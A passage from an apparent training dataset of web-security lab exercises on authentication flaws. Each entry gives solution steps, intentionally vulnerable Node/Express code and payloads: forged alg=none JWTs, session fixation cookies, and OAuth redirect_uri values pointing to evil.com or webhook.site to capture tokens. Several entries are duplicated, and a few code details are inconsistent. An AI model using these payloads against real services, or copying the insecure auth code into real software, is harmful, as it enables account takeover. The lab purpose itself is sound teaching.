  "Lab Description": "The application's JWT validation mechanism fails to properly verify the signing algorithm, allowing attackers to spoof tokens by injecting their own public key. The vulnerable backend accepts tokens with user-defined headers and improperly trusts attacker-supplied keys. To solve: Forge a valid JWT to impersonate Carlos and access /account-info.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to intercept a login response and observe the JWT returned in the Authorization header.",
    "2. Decode the JWT using jwt.io or Burp Decoder and observe the alg: RS256 field.",
    "3. Generate your own RSA keypair using openssl, and craft a malicious JWT with alg set to HS256 while using the public key as the HMAC secret.",
    "4. Sign the forged token using the HS256 algorithm and your RSA public key as the secret.",
    "5. Send a request to GET /account-info with Authorization: Bearer <forged token> and verify access to Carlos's data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const PUBLIC_KEY = fs.readFileSync('public.pem'); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'securepass') { const token = jwt.sign({ user: 'carlos', role: 'user' }, PRIVATE_KEY, { algorithm: 'RS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account-info', (req, res) => { try { const token = req.headers.authorization.split(' ')[1]; const decoded = jwt.verify(token, PUBLIC_KEY); if (decoded.user === 'carlos') return res.send('Account info for Carlos'); } catch (e) { return res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('JWT Signature Confusion Lab running on http://localhost:4000'));",
  "payloads": [
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6InVzZXIifQ.<signed_with_public_key>",
    "JWT with alg: HS256, using attacker's public RSA key as the secret"
  ]
},
{
  "Lab scenario": "Session fixation in SOAP login handler",
  "Lab Description": "The SOAP-based login API does not invalidate existing session identifiers after successful login. This enables an attacker to fix a session ID before authentication. To solve: Fix a session for Carlos, log him in using the fixed ID, then reuse it to access /user-profile.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Intercept a POST /soap/login request using Burp Suite. Note the Set-Cookie: sessionid value in the response.",
    "2. Manually send a crafted SOAP request with a predefined sessionid value in the Cookie header.",
    "3. Trick Carlos (or simulate in lab) to log in while using the fixed session ID by replaying the SOAP request with his credentials.",
    "4. Once Carlos logs in, reuse the same session ID to access /user-profile with Cookie: sessionid=<fixed_id>.",
    "5. Verify you have hijacked Carlos's session by viewing his profile info."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.text({ type: '*/*' })); app.use(cookieParser()); const sessions = {}; app.post('/soap/login', (req, res) => { const xml = req.body; const username = xml.match(/<username>(.*?)<\\/username>/)[1]; const password = xml.match(/<password>(.*?)<\\/password>/)[1]; if (username === 'carlos' && password === 'letmein') { const sid = req.cookies.sessionid || Math.random().toString(36).substring(2); sessions[sid] = username; res.setHeader('Set-Cookie', `sessionid=${sid}`); return res.send(`<response>Logged in</response>`); } res.status(401).send('<response>Unauthorized</response>'); }); app.get('/user-profile', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user === 'carlos') return res.send('Profile: Carlos'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation SOAP Lab running on http://localhost:4000'));",
  "payloads": [
    "POST /soap/login with Cookie: sessionid=fixed123 and body: <username>carlos</username><password>letmein</password>",
    "GET /user-profile with Cookie: sessionid=fixed123"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in GraphQL mutation token issuance",
  "Lab Description": "The OAuth implementation uses the implicit grant flow without validating the redirect_uri. This allows an attacker to intercept access tokens by injecting a malicious redirection endpoint. To solve: Capture Carlos’s token via redirection abuse and use it to access his profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Postman to inspect the GraphQL mutation for `generateOAuthToken(redirect_uri)`.",
    "2. Observe that no validation is enforced on the redirect_uri domain.",
    "3. Set redirect_uri to a public HTTP request bin or webhook.site and initiate the OAuth login.",
    "4. The access_token for Carlos will be leaked to your endpoint via the URL fragment.",
    "5. Extract the token and use it in Authorization: Bearer <token> to access /graphql with query { profile }."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const tokens = {}; app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('generateOAuthToken')) { const redirectMatch = query.match(/redirect_uri:\\\"(.*?)\\\"/); const redirect = redirectMatch ? redirectMatch[1] : ''; const token = 'token-carlos-abc123'; tokens[token] = 'carlos'; return res.send({ data: { url: `${redirect}#access_token=${token}` } }); } if (query.includes('{ profile }')) { const auth = req.headers.authorization?.split(' ')[1]; if (tokens[auth] === 'carlos') return res.send({ data: { profile: 'Carlos Profile Data' } }); return res.status(403).send('Invalid token'); } res.status(400).send('Invalid request'); }); app.listen(4000, () => console.log('OAuth GraphQL Lab running on http://localhost:4000'));",
  "payloads": [
    "GraphQL mutation: generateOAuthToken(redirect_uri: \"https://webhook.site/abc\")",
    "Authorization: Bearer token-carlos-abc123 in POST /graphql with query { profile }"
  ]
},
{
  "Lab scenario": "GraphQL API session fixation vulnerability in login flow",
  "Lab Description": "The GraphQL API-based authentication system is vulnerable to session fixation due to insecure token re-use. The application does not invalidate old session tokens after login. To solve the lab, hijack Carlos’s session after login using a fixed session ID.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Using Burp Suite, intercept a GraphQL login mutation with your own credentials and note the issued session cookie.",
    "2. Manipulate the session cookie (e.g., sessionId=ABC123) and resend the login request. Confirm that the same session cookie is still used after login.",
    "3. Send the fixed sessionId=ABC123 to the victim (Carlos) via a social engineering link.",
    "4. Wait for Carlos to log in, inheriting the fixed session ID you provided.",
    "5. Use sessionId=ABC123 to access /graphql with a query for Carlos’s account info. The lab is solved when Carlos’s account data is retrieved."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const sessions = {}; const users = { 'carlos': { password: 'letmein', data: 'Sensitive info' }, 'wiener': { password: 'testpass', data: 'Test data' } }; app.post('/graphql', (req, res) => { const { query, variables } = req.body; const sessionId = req.cookies.sessionId || variables?.sessionId; if (query.includes('mutation Login')) { const { username, password } = variables; if (users[username] && users[username].password === password) { sessions[sessionId] = username; res.cookie('sessionId', sessionId); return res.json({ data: { login: 'Success' } }); } return res.json({ errors: ['Invalid login'] }); } else if (query.includes('query GetAccount')) { const username = sessions[sessionId]; if (username) return res.json({ data: { account: users[username].data } }); return res.status(403).json({ error: 'Unauthorized' }); } }); app.listen(4000, () => console.log('GraphQL Session Fixation Lab running on port 4000'));",
  "payloads": [
    "sessionId=ABC123",
    "mutation Login($username: String!, $password: String!) { login(username: $username, password: $password) }",
    "query GetAccount { account }"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion in admin verification logic",
  "Lab Description": "The application uses JWTs to control access to the admin panel. It mistakenly allows clients to specify the JWT algorithm, trusting unsigned tokens when 'alg' is set to 'none'. To solve the lab, forge an admin JWT to access /admin/dashboard.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. With OWASP ZAP or Burp Suite, intercept the JWT in a login request. Decode it and observe the algorithm and payload.",
    "2. Modify the JWT to set 'alg':'none' and manually change the payload to { \"username\": \"carlos\", \"role\": \"admin\" }.",
    "3. Remove the signature and rebase64-encode the header and payload segments only.",
    "4. Replace the Authorization header with the forged JWT.",
    "5. Send a GET request to /admin/dashboard. If successful, the lab is solved when admin panel data loads."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'insecure-secret'; app.use((req, res, next) => { const auth = req.headers['authorization']; if (auth && auth.startsWith('Bearer ')) { const token = auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload; } else { req.user = jwt.verify(token, secret); } } catch (e) { return res.status(401).send('Invalid token'); } } next(); }); app.get('/admin/dashboard', (req, res) => { if (req.user?.role === 'admin') return res.send('Admin dashboard loaded for ' + req.user.username); return res.status(403).send('Access denied'); }); app.listen(3001, () => console.log('JWT Algorithm Confusion Lab running on port 3001'));",
  "payloads": [
    "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
    "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
    "JWT: <base64(header)>.<base64(payload)>."
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in third-party login provider redirect flow",
  "Lab Description": "This lab uses an OAuth2 provider to authenticate users. Due to lack of state parameter validation and open redirect behavior, the login flow is vulnerable to authorization code injection. To solve the lab, log in as Carlos by exploiting the redirect_uri parameter.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Postman or Burp Suite to initiate OAuth login and capture the /authorize request. Notice the 'redirect_uri' parameter is echoed by the server.",
    "2. Modify the 'redirect_uri' to a URL under your control. Observe that it gets used after authorization.",
    "3. Manually request an authorization code from the OAuth provider while logged in as Carlos.",
    "4. Inject the valid code for Carlos into the redirected callback with your manipulated 'redirect_uri'.",
    "5. The target app will accept and process the valid authorization code without verifying state. Once redirected to your account as Carlos, the lab is solved."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); app.get('/oauth/callback', async (req, res) => { const { code, redirect_uri } = req.query; try { const tokenRes = await axios.post('https://oauth.fake/token', { code, redirect_uri }); const profile = await axios.get('https://oauth.fake/userinfo', { headers: { Authorization: 'Bearer ' + tokenRes.data.access_token } }); const user = profile.data.username; res.send('Welcome back, ' + user); } catch (err) { res.status(400).send('OAuth failed'); } }); app.listen(5000, () => console.log('OAuth Redirect Flow Lab running on port 5000'));",
  "payloads": [
    "GET /oauth/callback?code=<valid_code>&redirect_uri=https://evil.com/callback",
    "POST /token { code: <valid_code>, redirect_uri: https://evil.com/callback }",
    "OAuth URL: https://oauth.fake/authorize?client_id=xyz&redirect_uri=https://evil.com/callback"
  ]
},
{
  "Lab scenario": "GraphQL endpoint leaking JWT secret key",
  "Lab Description": "The application exposes a GraphQL API endpoint with introspection enabled and verbose error messages. A mutation leaks internal secrets including the JWT signing key through improper error handling. The application accepts tampered tokens signed with the leaked key. To solve: forge a valid admin JWT and access the admin dashboard.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Postman to perform introspection queries on /graphql and identify all available mutations.",
    "2. Trigger the `generateToken(secret: String!)` mutation with malformed input. Observe verbose error disclosing the signing key.",
    "3. Craft a JWT token using jwt.io or a custom Node script, setting `alg` to HS256, and payload `{ \"role\": \"admin\" }`, signed with leaked key.",
    "4. Use Burp Suite to replace the Authorization header with `Bearer <forged-token>` on /admin.",
    "5. Observe successful access to the admin panel, verifying the exploit succeeded."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const secret = 'supersecretjwtkey'; const users = [{ username: 'admin', role: 'admin' }]; const schema = buildSchema(` type Query { currentUser: String } type Mutation { generateToken(secret: String!): String } `); const root = { currentUser: (args, req) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret); return decoded.role; } catch (e) { return 'unauthorized'; } }, generateToken: ({ secret }) => { if (secret.length < 8) throw new Error(`Secret too short: expected >8, got ${secret.length}`); return jwt.sign({ role: 'user' }, secret); } }; app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true })); const PORT = 4000; app.listen(PORT, () => console.log(`GraphQL Lab running at http://localhost:${PORT}/graphql`));",
  "payloads": [
    "{\"query\": \"mutation { generateToken(secret: \\\"123\\\") }\"}",
    "Header: Authorization: Bearer <forged JWT signed with leaked key>",
    "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }.{ \"role\": \"admin\" }.<signature>"
  ]
},
{
  "Lab scenario": "Session fixation in OAuth redirect handling",
  "Lab Description": "This app integrates with an external OAuth provider for login. The application does not validate that the `state` parameter maps to the initiating session, enabling session fixation. To solve: hijack a victim’s session by initiating login and forcing a reused session ID through manipulated OAuth flow.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP to intercept the OAuth login flow and observe the `state` parameter.",
    "2. Initiate login as attacker, then copy your session cookie.",
    "3. Send crafted OAuth URL to victim with fixed `state` and redirect_uri, making victim complete auth.",
    "4. Victim is redirected and binds session to attacker-controlled session ID.",
    "5. Reuse session token in Burp to access victim account under fixed session context."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const axios = require('axios'); const app = express(); app.use(cookieParser()); let sessions = {}; app.get('/login', (req, res) => { const state = Math.random().toString(36).substring(2); sessions[state] = {}; res.redirect(`https://oauth-provider.com/auth?state=${state}&redirect_uri=http://localhost:4000/callback`); }); app.get('/callback', (req, res) => { const { state, code } = req.query; axios.post('https://oauth-provider.com/token', { code }).then(resp => { const userInfo = resp.data.user; sessions[state].user = userInfo; res.cookie('session', state); res.redirect('/account'); }); }); app.get('/account', (req, res) => { const session = req.cookies.session; if (sessions[session] && sessions[session].user) res.send(`Welcome ${sessions[session].user.username}`); else res.send('Not logged in'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Session Fixation Lab on http://localhost:${PORT}`));",
  "payloads": [
    "https://oauth-provider.com/auth?state=attacker123&redirect_uri=http://localhost:4000/callback",
    "Cookie: session=attacker123",
    "GET /callback?state=attacker123&code=valid-oauth-code"
  ]
},
{
  "Lab scenario": "JWT none algorithm acceptance",
  "Lab Description": "The application uses stateless JWT tokens for user authentication. The JWT validation logic improperly accepts unsigned tokens with the 'none' algorithm. To solve: forge a token impersonating the admin user with alg=none and access the admin dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to intercept your login token and decode it using jwt.io.",
    "2. Change the payload to `{ \"username\": \"admin\", \"role\": \"admin\" }`.",
    "3. Set JWT header `alg` to `none` and remove the signature.",
    "4. Replace your session cookie with the modified token.",
    "5. Access /admin and verify privileged access granted."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'adminpass', role: 'admin' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, 'secret123'); res.send({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') return res.send(`Admin panel - Welcome ${payload.payload.username}`); const verified = jwt.verify(token, 'secret123'); if (verified.role === 'admin') return res.send('Admin panel access granted'); else res.send('Not an admin'); } catch (e) { res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab at http://localhost:${PORT}`));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
    "Header: Authorization: Bearer <none-algorithm-token>",
    "{ \"alg\": \"none\" }.{ \"username\": \"admin\", \"role\": \"admin\" }."
  ]
},
{
  "Lab scenario": "Session ID predictable in SOAP-based login service",
  "Lab Description": "The application provides a legacy SOAP login service that generates sessions using predictable UUIDv4. By analyzing responses, an attacker can brute-force valid sessions. To solve: predict Carlos’s session token and access his profile.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use OWASP ZAP to send multiple login requests to /soapLoginService and observe pattern of session IDs returned in Set-Cookie.",
    "2. Use a Node script with UUID generator to generate next likely session ID.",
    "3. Replay a GET /profile request with the guessed session cookie using Postman.",
    "4. Verify access to Carlos’s profile page is granted via the guessed session.",
    "5. Flag obtained session as valid and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const uuid = require('uuid'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.text({ type: 'application/soap+xml' })); let sessions = {}; app.post('/soapLoginService', (req, res) => { const match = req.body.match(/<username>(.*?)<\\/username><password>(.*?)<\\/password>/); if (!match) return res.status(400).send('Malformed SOAP'); const [_, username, password] = match; if (username === 'carlos' && password === 'password123') { const sessionId = uuid.v4(); sessions[sessionId] = username; res.setHeader('Set-Cookie', `session=${sessionId}`); res.send(`<soap:Envelope><soap:Body>Login Success</soap:Body></soap:Envelope>`); } else res.send(`<soap:Envelope><soap:Body>Login Failed</soap:Body></soap:Envelope>`); }); app.get('/profile', (req, res) => { const session = req.headers.cookie?.split('=')[1]; if (sessions[session]) res.send(`Profile of ${sessions[session]}`); else res.send('Access Denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`SOAP Session ID Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "<soap:Envelope><soap:Body><username>carlos</username><password>password123</password></soap:Body></soap:Envelope>",
    "Cookie: session=generated-uuid-approximation",
    "GET /profile with guessed session header"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion in token validation endpoint",
  "Lab Description": "The application uses JWT for authentication and accepts tokens via the Authorization header. The backend attempts to verify the JWT signature using the algorithm specified in the token's header. This results in a classic 'algorithm confusion' flaw, where changing the algorithm to 'none' skips signature validation entirely. To solve: craft a tampered JWT granting access to the administrator’s dashboard without the original signing key.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept a valid login using Burp Suite and capture the JWT from the Authorization header.",
    "Decode the JWT using jwt.io or Postman to observe the header and payload. Note the original algorithm used (e.g., HS256).",
    "Modify the token header to use \"alg\":\"none\" and change the payload to {\"username\":\"admin\"}.",
    "Reconstruct the JWT without a signature (no third part), and replace the Authorization header value with this tampered token.",
    "Send the request to the /admin endpoint and verify access to the administrator panel is granted."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'adminpass' }, { username: 'user', password: 'userpass' }]; const secret = 'topsecretkey'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ username: user.username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded?.header?.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'admin') return res.send('Admin panel'); } try { const verified = jwt.verify(token, secret); if (verified.username === 'admin') return res.send('Admin panel'); } catch (e) { return res.status(401).send('Access Denied'); } res.status(403).send('Forbidden'); }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
    "{\"alg\":\"none\"}.{\"username\":\"admin\"}."
  ]
},
{
  "Lab scenario": "Session fixation via login handler",
  "Lab Description": "This application fails to regenerate the session ID after successful login. An attacker can set a known session ID before login and later trick the victim to authenticate, thereby gaining control over the authenticated session. To solve: hijack Carlos's session by pre-setting a session cookie and waiting for him to log in.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to visit the site and set a fixed session ID like sessionid=attacker123 before login.",
    "Send the fixed session link to Carlos using the /send-message endpoint that simulates user email delivery.",
    "Wait until Carlos logs in and his session is bound to sessionid=attacker123.",
    "Reuse the same sessionid cookie in a new browser session and access /my-account.",
    "Verify that Carlos’s account is accessible using the hijacked session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.get('/', (req, res) => { if (!req.cookies.sessionid) { const sid = Math.random().toString(36).substr(2); res.cookie('sessionid', sid); sessions[sid] = {}; } res.send('Welcome'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sessionid; const user = users.find(u => u.username === username && u.password === password); if (user && sid) { sessions[sid].username = username; res.send('Login successful'); } else { res.status(401).send('Failed'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]?.username === 'carlos') return res.send('Carlos account accessed'); res.status(403).send('Forbidden'); }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Set-Cookie: sessionid=attacker123",
    "Access Carlos login endpoint while sharing same sessionid cookie"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration allows token reuse across clients",
  "Lab Description": "The application uses OAuth2 for login via a third-party identity provider. However, the backend fails to validate the 'aud' (audience) claim in ID tokens, allowing a token from another client app to be reused in this one. To solve: use a token issued to another client to access the target protected resource.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Register a malicious client with the same identity provider and log in to retrieve a valid OAuth2 ID token.",
    "Capture the token from your app and inspect its payload using jwt.io. Note the audience is set to 'attacker-client'.",
    "Send a request to the target app’s /oauth-login endpoint using the same token in a Bearer header.",
    "Since the backend fails to validate the audience, it accepts the token and grants access.",
    "Access the /sensitive-data endpoint using the token and confirm it belongs to Carlos's account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const sensitiveData = { 'carlos': 'flag{supersecret}' }; app.post('/oauth-login', (req, res) => { const token = req.body.token; try { const decoded = jwt.verify(token, '', { ignoreExpiration: true }); // Signature skipped for demo if (decoded && decoded.sub === 'carlos') { res.cookie('session', 'oauthsession'); res.send('Login accepted'); } else { res.status(401).send('Invalid sub'); } } catch (err) { res.status(400).send('Bad token'); } }); app.get('/sensitive-data', (req, res) => { if (req.cookies.session === 'oauthsession') return res.send(sensitiveData['carlos']); res.status(403).send('Forbidden'); }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Reuse Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Bearer eyJhbGciOi... (ID token with sub=carlos, aud=attacker-client)",
    "POST /oauth-login { token: '...' }"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion in token validation endpoint",
  "Lab Description": "The application uses JWT for authentication and accepts tokens via the Authorization header. The backend attempts to verify the JWT signature using the algorithm specified in the token's header. This results in a classic 'algorithm confusion' flaw, where changing the algorithm to 'none' skips signature validation entirely. To solve: craft a tampered JWT granting access to the administrator’s dashboard without the original signing key.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept a valid login using Burp Suite and capture the JWT from the Authorization header.",
    "Decode the JWT using jwt.io or Postman to observe the header and payload. Note the original algorithm used (e.g., HS256).",
    "Modify the token header to use \"alg\":\"none\" and change the payload to {\"username\":\"admin\"}.",
    "Reconstruct the JWT without a signature (no third part), and replace the Authorization header value with this tampered token.",
    "Send the request to the /admin endpoint and verify access to the administrator panel is granted."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'adminpass' }, { username: 'user', password: 'userpass' }]; const secret = 'topsecretkey'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ username: user.username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded?.header?.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'admin') return res.send('Admin panel'); } try { const verified = jwt.verify(token, secret); if (verified.username === 'admin') return res.send('Admin panel'); } catch (e) { return res.status(401).send('Access Denied'); } res.status(403).send('Forbidden'); }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
    "{\"alg\":\"none\"}.{\"username\":\"admin\"}."
  ]
},
{
  "Lab scenario": "Session fixation via login handler",
  "Lab Description": "This application fails to regenerate the session ID after successful login. An attacker can set a known session ID before login and later trick the victim to authenticate, thereby gaining control over the authenticated session. To solve: hijack Carlos's session by pre-setting a session cookie and waiting for him to log in.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to visit the site and set a fixed session ID like sessionid=attacker123 before login.",
    "Send the fixed session link to Carlos using the /send-message endpoint that simulates user email delivery.",
    "Wait until Carlos logs in and his session is bound to sessionid=attacker123.",
    "Reuse the same sessionid cookie in a new browser session and access /my-account.",
    "Verify that Carlos’s account is accessible using the hijacked session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.get('/', (req, res) => { if (!req.cookies.sessionid) { const sid = Math.random().toString(36).substr(2); res.cookie('sessionid', sid); sessions[sid] = {}; } res.send('Welcome'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sessionid; const user = users.find(u => u.username === username && u.password === password); if (user && sid) { sessions[sid].username = username; res.send('Login successful'); } else { res.status(401).send('Failed'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]?.username === 'carlos') return res.send('Carlos account accessed'); res.status(403).send('Forbidden'); }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Set-Cookie: sessionid=attacker123",
    "Access Carlos login endpoint while sharing same sessionid cookie"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration allows token reuse across clients",
  "Lab Description": "The application uses OAuth2 for login via a third-party identity provider. However, the backend fails to validate the 'aud' (audience) claim in ID tokens, allowing a token from another client app to be reused in this one. To solve: use a token issued to another client to access the target protected resource.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Register a malicious client with the same identity provider and log in to retrieve a valid OAuth2 ID token.",
    "Capture the token from your app and inspect its payload using jwt.io. Note the audience is set to 'attacker-client'.",
    "Send a request to the target app’s /oauth-login endpoint using the same token in a Bearer header.",
    "Since the backend fails to validate the audience, it accepts the token and grants access.",
    "Access the /sensitive-data endpoint using the token and confirm it belongs to Carlos's account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const sensitiveData = { 'carlos': 'flag{supersecret}' }; app.post('/oauth-login', (req, res) => { const token = req.body.token; try { const decoded = jwt.verify(token, '', { ignoreExpiration: true }); // Signature skipped for demo if (decoded && decoded.sub === 'carlos') { res.cookie('session', 'oauthsession'); res.send('Login accepted'); } else { res.status(401).send('Invalid sub'); } } catch (err) { res.status(400).send('Bad token'); } }); app.get('/sensitive-data', (req, res) => { if (req.cookies.session === 'oauthsession') return res.send(sensitiveData['carlos']); res.status(403).send('Forbidden'); }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Reuse Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Bearer eyJhbGciOi... (ID token with sub=carlos, aud=attacker-client)",
    "POST /oauth-login { token: '...' }"
  ]
},
{
  "Lab scenario": "Session Fixation via Legacy Cookie Reuse in REST Login Flow",
  "Lab Description": "The application implements session tracking using a legacy session cookie `sid`, which is not regenerated on successful login. This flaw allows session fixation if a valid but unauthenticated session ID is issued prior to login. To solve: hijack Carlos’s session by fixing the session ID before he logs in, then access his account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept the GET /login request and capture the `Set-Cookie: sid` header for your own unauthenticated session.",
    "Forward the login request but do not complete the login process. In Burp, send a crafted phishing email link to Carlos using POST /message with the fixed `sid` as a cookie.",
    "Wait for Carlos to log in using the fixed session ID. Use Burp to monitor active sessions with /admin/session-logs.",
    "Once Carlos is authenticated on the fixed session, reuse the session ID cookie to access /my-account.",
    "Verify Carlos’s name in the response and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'hunter2' }; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(2); sessions[sid] = null; res.cookie('sid', sid); res.send('<form method=\"POST\">...</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; if (users[username] === password) { sessions[sid] = username; res.redirect('/my-account'); } else res.send('Login failed'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const user = sessions[sid]; if (user) res.send(`Welcome ${user}`); else res.send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "GET /login",
    "Set fixed sid cookie before user logs in",
    "Reuse sid after user logs in"
  ]
},
{
